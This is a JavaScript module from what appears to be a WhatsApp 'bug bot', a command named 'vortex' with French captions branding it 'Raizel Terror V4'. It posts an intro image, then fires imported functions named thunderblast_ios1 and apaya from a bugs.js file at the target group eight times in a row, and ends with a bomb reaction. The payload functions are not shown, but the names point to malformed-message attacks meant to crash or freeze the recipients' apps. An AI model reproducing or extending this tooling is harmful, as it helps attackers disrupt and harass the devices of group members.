// vortex.js
export const name = "vortex";

import { thunderblast_ios1, apaya, sleep } from './bugs.js';

export async function execute(sock, msg, args) {
    const from = msg.key.remoteJid;

    const imageUrl = "https://files.catbox.moe/aanan8.jpg";
    const caption = `
╔════════════════════╗
       ⚡ VORTEX GC ⚡
╚════════════════════╝

🎯 Traitement du groupe en cours...
🛡️ Module : *Raizel Terror V4*
⏳ Patientez pendant l'injection des modules...
`;

    try {
        // Message d’intro
        await sock.sendMessage(from, {
            image: { url: imageUrl },
            caption: caption
        }, { quoted: msg });

        await sleep(2000);

        // ⚡ Exécution séquentielle des bugs
        await thunderblast_ios1(sock, from);
        await sleep(1000);
        await apaya(sock, from);
        await sleep(1000);
        await thunderblast_ios1(sock, from);
        await sleep(1000);
        await thunderblast_ios1(sock, from);
        await sleep(1000);
        await apaya(sock, from);
        await sleep(1000);
        await thunderblast_ios1(sock, from);
        await sleep(1000);
        await thunderblast_ios1(sock, from);
        await sleep(1000);
        await thunderblast_ios1(sock, from);

        // Réaction finale
        await sock.sendMessage(from, { react: { text: "💣", key: msg.key } });

    } catch (error) {
        console.error("❌ Erreur Vortex :", error);
        await sock.sendMessage(from, { text: "❌ Impossible d'exécuter Vortex." }, { quoted: msg });
    }
}